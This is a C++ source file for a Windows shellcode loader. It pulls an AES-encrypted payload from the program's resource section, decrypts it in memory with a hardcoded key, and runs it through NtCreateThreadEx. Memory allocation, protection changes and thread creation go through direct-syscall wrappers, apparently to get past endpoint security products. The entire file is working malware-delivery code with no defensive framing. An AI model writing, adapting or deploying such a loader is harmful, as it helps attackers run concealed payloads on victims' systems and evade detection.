#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <process.h>
#include "resource.h"
#include <psapi.h>
#include "syscalls_mem.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")


#define NtCurrentProcess() ((HANDLE)0xFFFFFFFF)


#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

OBJECT_ATTRIBUTES oa;








int getthatdecrypted_sea(char* payload, unsigned int payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}







int main(void) {

	
	HANDLE hProc = (HANDLE)-1;


	HGLOBAL resHandle = NULL;
	HRSRC res;

	unsigned char* stream;
	unsigned int stream_len;


	// Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	stream = (unsigned char*)LockResource(resHandle);
	stream_len = SizeofResource(NULL, res);

	unsigned char key[] = { 0x7e, 0x36, 0xe7, 0xa7, 0x3e, 0xf2, 0xaa, 0x33, 0x5, 0xc, 0xcb, 0xc5, 0xe0, 0x94, 0xfa, 0x3f };



	LPVOID baseAddress = NULL;

	size_t allocSize = stream_len;

	LPVOID rb;

	auto status = CRACK_NtAVM(hProc, &baseAddress, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to Allocate memory at 0x%p, NTSTATUS: 0x%x\n", baseAddress, status);
		return EXIT_FAILURE;
	}
	printf("[*] Successfully allocated RWX memory at 0x%p of size %lld\n", baseAddress, allocSize);
	getchar();


	size_t shellcodeSize = sizeof(stream) / sizeof(stream[0]);
	printf("[*] Shellcode length: %lld\n", shellcodeSize);
	getchar();

	DWORD oldProtect1;
	status = CRACK_NtPVM(hProc, &baseAddress, (PSIZE_T)&stream_len, PAGE_EXECUTE_READWRITE, &oldProtect1);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to change permission to RWX on memory at 0x%p, NTSTATUS: 0x%x\n", baseAddress, status);
		return EXIT_FAILURE;
	}
	printf("[*] Successfully changed memory protections to RWX\n");
	getchar();

	status = CRACK_NtWVM(hProc, baseAddress, stream, stream_len, NULL);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to write at at 0x%p, NTSTATUS: 0x%x\n", baseAddress, status);
		return EXIT_FAILURE;
	}
	printf("Cipher Text Shell code written at Allocated Virtual Memory from rsrc_section \n");
	getchar();


	getthatdecrypted_sea((char*)baseAddress, stream_len, (char*)key, sizeof(key));

	printf("AES Decryption Done at Allocated Memory \n");
	getchar();

	DWORD oldProtect;
	status = CRACK_NtPVM(hProc, &baseAddress, (PSIZE_T)&stream_len, PAGE_EXECUTE_READ, &oldProtect);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to change permission to RX on memory at 0x%p, NTSTATUS: 0x%x\n", baseAddress, status);
		return EXIT_FAILURE;
	}
	printf("[*] Successfully changed memory protections to RX\n");
	getchar();


	HANDLE threadhandle;
	CRACK_NtCTE(&threadhandle, 0x1FFFFF, NULL, hProc, (LPTHREAD_START_ROUTINE)baseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	if (threadhandle == NULL) {
		CloseHandle(hProc);
		printf("ThreadHandle failed :( exiting...\n");
		return -2;
	}
	else {
		printf("successfully inject via NtCreateThreadEx :)\n");
	}

	printf("Thread created using NtCreateThreadEx \n");
	WaitForSingleObject(threadhandle, INFINITE);




	
	
	CloseHandle(hProc);

	
}
